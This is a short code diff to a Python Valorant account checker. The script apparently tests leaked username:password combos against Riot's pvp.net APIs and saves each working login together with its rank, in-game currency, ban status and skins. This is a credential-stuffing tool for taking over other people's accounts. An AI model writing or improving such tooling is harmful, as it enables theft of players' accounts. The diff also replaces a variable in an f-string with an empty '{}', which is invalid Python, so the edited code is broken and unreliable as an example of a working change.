@@ -277,6 +277,7 @@ def checker():
                 last_time = result_s2
             except:
                 result_s2 = "Unkown"
+                last_time = "Unkown"
     #get Rank
             try:
                 CheckRanked = requests.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders)
@@ -322,7 +323,7 @@ def checker():
                 bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[------------------------------------]\n\n")
                 bannedtxt12.close()
                 if choice == 3:
-                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
+                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
                 good += 1
                 continue
 checker()
